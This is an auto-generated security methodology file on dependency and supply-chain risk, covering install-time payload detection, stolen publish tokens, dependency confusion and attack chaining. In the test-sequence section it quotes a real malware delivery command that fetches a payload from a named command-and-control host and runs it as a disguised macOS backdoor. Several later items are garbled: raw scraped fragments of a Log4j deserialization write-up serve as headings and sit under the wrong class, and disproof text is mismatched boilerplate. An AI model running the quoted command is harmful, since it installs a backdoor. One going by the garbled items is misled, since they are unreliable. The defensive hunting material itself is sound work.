# Methodology — Dependency / Supply-Chain Risk

> Derived from 17 verified items. Regenerate with `python -m wks.methodgen --class supply_chain --apply`. Do not hand-edit: this file is a projection of the evidence, and edits are lost on the next cycle.

**Surface.** Trust placed in a component, its registry or its build exceeds what was actually verified.

**References.** CWE-1104 · A06:2021

## Preconditions

_No verified prerequisite items yet._ Derived from evidence only, so this section is empty rather than plausible.


## 1. Reconnaissance signals

_What to look for while mapping the surface, and where each signal tells you the rest of the procedure is worth running._

**Supply-chain attacks that avoid embedding malicious logic in the primary package and instead introduce a secondary dependency executed at install time are identifiable by a Node.js process spawning an OS-native execution path that fetches a remote payload, detached from the original process.**

Because the observed behavior is cross-platform and identical across Linux, Windows and macOS, a hunter can alert on the execution shape rather than on package names, which catches the delivery stage even when the package name is new and the primary package looks untouched. The signal to hunt is a build or install event where a language runtime spawns an OS-native binary that reaches out to the network. The claim is falsified as a hunting premise by build pipelines that block post-install scripts and never permit a package install to reach the network.

- *Disproof:* Build pipelines that block post-install scripts and never permit a package install to reach the network would refute the claim as a hunting premise.
- *Evidence:* high_confidence — [elastic.co](https://www.elastic.co/security-labs/blog/axios-supply-chain-compromise-detections); [labs.watchtowr.com](https://labs.watchtowr.com/8-million-requests-later-we-made-the-solarwinds-supply-chain-attack-look-amateur/)

## 2. Test sequence

_Concrete mutations to try. Each is written to be executable, not to be a description of the vulnerability._

**A dependency's postinstall script that reaches the network is a delivery stage, detectable by a child process fetching a remote payload detached from the original process.**

Supply-chain attacks that avoid embedding malicious logic in the primary package instead introduce a secondary dependency executed at install time. The signal is a build or install event where a language runtime spawns an OS-native binary that reaches out to the network. The hunt procedure is to instrument a sandbox before installing: a process-creation trace, a filesystem watcher on paths outside node_modules, and an egress log. Then run the install and correlate. The pass condition is a captured effect tied to that install: a child process with the dependency's script as its parent, a file created in a directory the package should never write, or a DNS or TCP event to a host that appears nowhere in the package's own documentation. Static presence of a postinstall script fails the test on its own.

- *Disproof:* Refuted if no lifecycle script executed during the install - because the install ran with --ignore-scripts, in a mode that suppresses them, or because the script's condition did not match your platform. It is also false if the only effect was a compilation step confined to the package's own build directory. A script whose observed outbound connection is to a registry or CDN the package's own dependency tree legitimately resolves at install time is not exfiltration.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/506.html); [docs.npmjs.com](https://docs.npmjs.com/cli/v11/using-npm/scripts)

**The payload path itself triggers the Potential Binary Masquerading via Invalid Code Signature and Suspicious URL as argument to Self-Signed Binary endpoint rules, as it mimics Apple naming conventions ( com.apple.* ) but does not match expected signing characteristics.**

-s http://sfrclak.com:8000/6202033 \
 && chmod 770 /Library/Caches/com.apple.act.mond \
 && /bin/zsh -c \"/Library/Caches/com.apple.act.mond http://sfrclak.com:8000/6202033 &\" \ &> /dev/null" 
 The delivered file produced the following execution matching on the file name masquerading attempt and the self-signed code signature : 
 Elastic Defend behavior alert triggering on the macOS backdoor 
 The payload path itself triggers the Potential Binary Masquerading via Invalid Code Signature and Suspicious URL as argument to Self-Signed Binary endpoint rules, as it mimics Apple naming conventions ( com.apple.* ) but does not match expected signing characteristics. 
 com.apple.act.mond is a custom-built macOS backdoor compiled as a universal Mach-O binary (x86_64 and ARM64) using C++ and Xcode, with HTTP-based C2 communications via libcurl and a JSON command protocol. 
 On initial check-in, it fingerprints the host, collecting hostname, username, OS version, hardware model, timezone, and a full process listing ( ps -eo user,pid,command ), which surfaces via

- *Disproof:* Refuted when: the resolved path stays inside the permitted base directory after the platform canonicalises it. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“The payload path itself triggers the Potential Binary Masquerading via Invalid C”) does not occur under a test that isolates that control.
- *Evidence:* high_confidence — [elastic.co](https://www.elastic.co/security-labs/blog/axios-supply-chain-compromise-detections); [securelist.com](https://securelist.com/vulnerabilities-and-exploits-in-q2-2026/121091/); [unit42.paloaltonetworks.com](https://unit42.paloaltonetworks.com/detecting-exposed-aws-iam-credentials/)

**A stolen package publish token lets an attacker ship further malicious versions, so one credential compromise propagates with no additional vulnerability required.**

Registry publish tokens are bearer credentials for a package namespace. Holding one means the attacker can release a new version that every downstream consumer installs by default, so the blast radius grows with no new attack. This changes how a token leak is scoped: the finding is not one exposed token but an attacker-controlled package namespace until the token is rotated and the account secured. Defensive review should look for provenance binding, publish-time attestation and short token lifetime rather than assuming rotation is immediate.

- *Disproof:* If the token is scoped to a single immutable version, already revoked, or otherwise unable to publish, no further version can be shipped and propagation does not occur.
- *Evidence:* high_confidence — [stepsecurity.io](https://www.stepsecurity.io/blog/introducing-deny-list-egress-policies-for-harden-runner); [unit42.paloaltonetworks.com](https://unit42.paloaltonetworks.com/detecting-exposed-aws-iam-credentials/)

**If it does not, the inner `get()` can still run unfiltered code in whatever *is* on that JVM.\n\n## Setting up detection for Java deserialization attacks\n1.**

ions 2.9.1 and 2.10.0 carry the field, but no FOIS, so the specific allowlist bypass does not apply there. We did not test every 2.x release, nor did we test Log4j 3 (discussion [#4168](https://archive.ph/Xowgn) says serialization is dropped there).\n\nThe defensive takeaway is the classpath: if the JVM that deserializes `LogEvent`s also ships a known gadget library, command execution is in play. If it does not, the inner `get()` can still run unfiltered code in whatever *is* on that JVM.\n\n## Setting up detection for Java deserialization attacks\n1. Deploy [Elastic Defend](https://www.elastic.co/docs/solutions/security/configure-elastic-defend) with process and network events on hosts that run JVMs (Complete EDR if you can).\n2. Enable the pre-built SIEM rules listed under Detection. \n3. Inventory processes that deserialize Java-serialized `LogEvent`s: leftover `TcpSocketServer`, `log4j-server` samples, `SerializedLayout` on a socket, or an

- *Disproof:* Refuted when: the same behaviour is absent when the single named control in the claim is present, and the control is shown to be present rather than assumed. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“If it does not, the inner `get()` can still run unfiltered code in whatever *is*”) does not occur under a test that isolates that control.
- *Evidence:* high_confidence — [elastic.co](https://www.elastic.co/security-labs/blog/axios-supply-chain-compromise-detections); [securelist.com](https://securelist.com/vulnerabilities-and-exploits-in-q2-2026/121091/)

**Chained together, they let an attacker-controlled object graph deserialize with no filter applied.**

https://github.com/apache/logging-log4j2/discussions/4168) on 1 July 2026 (`MarshalledObject.get()` deserializes with no Log4j filter). That discussion frames the work as 2.x hardening. Issue #4255 later named the same path.\n\n## How the Java deserialization allowlist bypass works\nNone of the pieces here is a bug on its own. The bypass comes from three behaviors in the official `2.26.1` source. Chained together, they let an attacker-controlled object graph deserialize with no filter applied. Here they are in order:\n\n| Step | Component | Behaviour | Why it matters |\n| :---- | :---- | :---- | :---- |\n| 1 | `SerializationUtil.REQUIRED_JAVA_CLASSES` | `java.rmi.MarshalledObject` sits on the allowlist as a Message delegate | The carrier class is permitted by design |\n| 2 | `FilteredObjectInputStream.resolveClass()` | Checks only class descriptors present on the stream it reads | A pa

- *Disproof:* Refuted when: the same behaviour is absent when the single named control in the claim is present, and the control is shown to be present rather than assumed. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“Chained together, they let an attacker-controlled object graph deserialize with ”) does not occur under a test that isolates that control.
- *Evidence:* high_confidence — [elastic.co](https://www.elastic.co/security-labs/blog/axios-supply-chain-compromise-detections); [securelist.com](https://securelist.com/vulnerabilities-and-exploits-in-q2-2026/121091/)

**The exception is 2.8.2: there, `TcpSocketServer` and the (log4j-core) `FilteredObjectInputStream` both ship in core, so a stock deployment using the built-in socket server is exposed without any leftover or custom receiver. #4255 bypasses the CVE-2017-5645 fix inside the same release that introduced it.**

`TcpSocketServer` / `ObjectInputStreamLogEventBridge` are gone from current `2.x` `log4j-core` sources. For current versions, the remaining exposure is leftover or custom code that still does new `FilteredObjectInputStream(socket.getInputStream())` and `readObject()` into a `LogEvent`. Historical `TcpSocketServer` constructed new `ServerSocket(port)`, which listens on all interfaces of that host. The exception is 2.8.2: there, `TcpSocketServer` and the (log4j-core) `FilteredObjectInputStream` both ship in core, so a stock deployment using the built-in socket server is exposed without any leftover or custom receiver. #4255 bypasses the CVE-2017-5645 fix inside the same release that introduced it. Whether a given leftover collector is reachable without credentials depends on how it was deployed. We are not stating that every collector is unauthenticated.\n\n## What we reproduced on Log4j 2.26.1\nWe used official Maven Central `log4j-api` 2.26.1 and `log4j-core` 2.26.1. The receiver implemented the public FOIS-plus-`LogEvent` read, bound to loopback for the run.\n\n* A class that `FilteredO

- *Disproof:* Refuted when: the payload is rejected when the same check runs with the defensive control ENABLED (a strict allowlist, a normalisation pass, or a WAF rule) rather than disabled. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“The exception is 2.8.2: there, `TcpSocketServer` and the (log4j-core) `FilteredO”) does not occur under a test that isolates that control.
- *Evidence:* high_confidence — [elastic.co](https://www.elastic.co/security-labs/blog/axios-supply-chain-compromise-detections); [securelist.com](https://securelist.com/vulnerabilities-and-exploits-in-q2-2026/121091/)

**After confirming the bypass against Log4j `2.26.1` via PoC validation and peeling back the layers on the prerequisites, we concluded this is not another Log4Shell. \n\nEither way, the detections we shared fire on what comes post-exploit for this family of vulnerabilities.**

ion](https://attack.mitre.org/techniques/T1190/) \n* [Command and Scripting Interpreter: Unix Shell](https://attack.mitre.org/techniques/T1059/004/) \n* [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210/)\n\n## Conclusion\nWe dug into issue #4255 as soon as it surfaced. After the last few years, anything pairing “Log4j” with remote code execution earns an immediate look. After confirming the bypass against Log4j `2.26.1` via PoC validation and peeling back the layers on the prerequisites, we concluded this is not another Log4Shell. \n\nEither way, the detections we shared fire on what comes post-exploit for this family of vulnerabilities. Commonly, a Java process spawns a shell after a connection. None are inherently a signature of #4255 exploitation, but triage can trace them back during investigation. Inventory your `LogEvent` receivers, hunt Java listeners on unexpected ports, and if you still deserialize Java `LogEvent` streams, look at alternatives, such as adding an `ObjectInputFilter` if using JDK 9. Assume FOIS alone is no

- *Disproof:* Refuted when: the payload is rejected when the same check runs with the defensive control ENABLED (a strict allowlist, a normalisation pass, or a WAF rule) rather than disabled. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“After confirming the bypass against Log4j `2.26.1` via PoC validation and peelin”) does not occur under a test that isolates that control.
- *Evidence:* high_confidence — [elastic.co](https://www.elastic.co/security-labs/blog/axios-supply-chain-compromise-detections); [securelist.com](https://securelist.com/vulnerabilities-and-exploits-in-q2-2026/121091/)

**Apache does not class allowlist bypasses like this one as product vulnerabilities, because Log4j does not deserialize data during normal logging.**

ed in August is a Java deserialization vulnerability in Log4j 2's `FilteredObjectInputStream`, and we reproduced it on official Maven Central `log4j-api` and `log4j-core 2.26.1`. Getting to command execution took two more things that Log4j itself does not ship. You need a process that still deserializes Java-serialized `LogEvent` objects, and you need a gadget library already sitting on that JVM. Apache does not class allowlist bypasses like this one as product vulnerabilities, because Log4j does not deserialize data during normal logging. In this post, we will cover:\n\n* The mechanism, cited from the official `2.26.1` source, and how it differs from Log4Shell.\n* What we did and did not observe in the lab, including the two conditions for command execution.\n* Which Elastic rules would fire on post-exploitation.\n* Hunting queries for Java-spawned shells and leftover serialized `LogEvent` collectors.\n\n## Why Apache does not cla

- *Disproof:* Refuted when: the payload is rejected when the same check runs with the defensive control ENABLED (a strict allowlist, a normalisation pass, or a WAF rule) rather than disabled. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“Apache does not class allowlist bypasses like this one as product vulnerabilitie”) does not occur under a test that isolates that control.
- *Evidence:* high_confidence — [elastic.co](https://www.elastic.co/security-labs/blog/axios-supply-chain-compromise-detections); [securelist.com](https://securelist.com/vulnerabilities-and-exploits-in-q2-2026/121091/)

## Validation

_No verified validation items yet._ Derived from evidence only, so this section is empty rather than plausible.


## 3. False-positive rejection

_The checks that eliminate the most common non-findings. Run these BEFORE reporting, not after a rejection._

**A CVE recorded against a third-party library in your dependency tree is evidence of an unmaintained or vulnerable component, not of supply-chain compromise, because compromise requires the attacker to have published or substituted the artifact your build actually consumed.**

The lookalike: a dependency scan returns a CVE for a package you depend on, the CVE text describes trojanized code injected into that library, and it is filed as a supply-chain compromise of your application. It is not. CWE-1104 is about relying on unmaintained components and the resulting difficulty of fixing significant bugs - that is a hygiene and patchability finding, not proof that anyone reached your build. The compromise class is separate and has a distinct observable event: the registry account or maintainer credential is used to publish a malicious version and consumers who install it receive the trojanized code. The axios operation ESET documented is exactly that - the lead maintainer's compromised credentials were used to publish malicious versions of a library with over 100 million weekly downloads, injecting trojanized code into affected systems before detection and removal. Note also that the rising count of registered vulnerabilities in third-party software is driven largely by AI-assisted discovery, which increases the number of CVEs without any increase in compromises. Discriminator: did the artifact your build resolved differ from the upstream published artifact? If the installed bytes match the published release and no unauthorized publish event exists on the package, you have a CVE to patch, not a compromise to report.

- *Disproof:* Refuted as a compromise claim when the version your build resolved matches the legitimate published release of the package, no unauthorized publish or account-takeover event exists on the registry, and the finding reduces to the CVE identifier in a scan report; refuted as unmaintained-component exposure only when the CVE's fixed version is already present in your lockfile.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/1104.html); [securelist.com](https://securelist.com/vulnerabilities-and-exploits-in-q2-2026/121091/); [welivesecurity.com](https://www.welivesecurity.com/en/eset-research/eset-apt-activity-report-q4-2025-q1-2026)

## 4. Known bypasses

_Filters and controls that have defeated the techniques above. Treat these as the reason a naive test fails, not as proof of safety._

**Dependency confusion: a private package registry can be bypassed when an attacker publishes a package with the same name to a public registry, and the build tooling resolves the public version because it is not explicitly configured to prefer the private source for that namespace.**

Dependency confusion exploits the default behavior of many package managers and CI pipelines. When a private registry is configured, tools often fall back to the public registry for anything not explicitly mapped. An attacker who registers a name that exists in the target's private scope but is unused in the public side can publish a malicious version. The victim's build then silently downloads the attacker's package instead of ever reaching the private registry. The hunting signal is a build log or process tree where a Node.js or Python process resolves a package from a public CDN URL rather than the configured private mirror, especially for names matching the target's internal package scope. Evidence: the resolved package was downloaded from a public host, not the private registry.

- *Disproof:* Refuted when the build explicitly configures the private registry with a scope mapping and the public fallback is disabled, or when the attacker's package name does not collide with any private namespace. If the build never reaches the network for the package name, or the resolution is pinned to a single authoritative source, the bypass does not occur.
- *Evidence:* high_confidence — [stepsecurity.io](https://www.stepsecurity.io/blog/introducing-deny-list-egress-policies-for-harden-runner); [unit42.paloaltonetworks.com](https://unit42.paloaltonetworks.com/detecting-exposed-aws-iam-credentials/)

## 5. Chaining

_How this class escalates when combined with others. Each step is anchored to a promoted item._

**Chain: a stolen CI credential to a self-propagating poisoned artifact reaches hosts by installing itself as an agent rather than by exploiting them.**

The chain has three observable halves. First, a CI runner's credentials are exposed because the runner can reach arbitrary network destinations, so any build step can exfiltrate them. Second, a poisoned artifact published to the registry executes at install time (postinstall script or lifecycle hook), fetching a secondary payload outside the package. Third, that payload re-executes on the host, installing itself as an agent so the compromise persists and re-propagates. Each half is independently observable: the egress log, the install-time process spawn, and the agent persistence entry. A convincing report shows all three halves with the artifact hash, the publish event, and the install effect.

- *Disproof:* Refuted if the CI runner's egress is restricted to the registry and no publish token exists on the runner, or if the delivered component is a passive data artifact with no execution hook on install. A compromised credential with no propagation path and no agent behavior stops at build compromise without host execution.
- *Evidence:* high_confidence — [securelist.com](https://securelist.com/tr/payload-ransomware-via-group-policy/121335/); [welivesecurity.com](https://www.welivesecurity.com/en/eset-research/eset-apt-activity-report-q4-2025-q1-2026/)

## Impact

_No verified impact items yet._ Derived from evidence only, so this section is empty rather than plausible.


## Coverage gap

These stages have no verified evidence and are therefore absent above: Preconditions, Validation, Impact.
A procedure with a missing validation stage is not safe to act on — it produces findings rather than proofs.

---

*Generated from the evidence base. Where this file and the database disagree, the database is correct.*
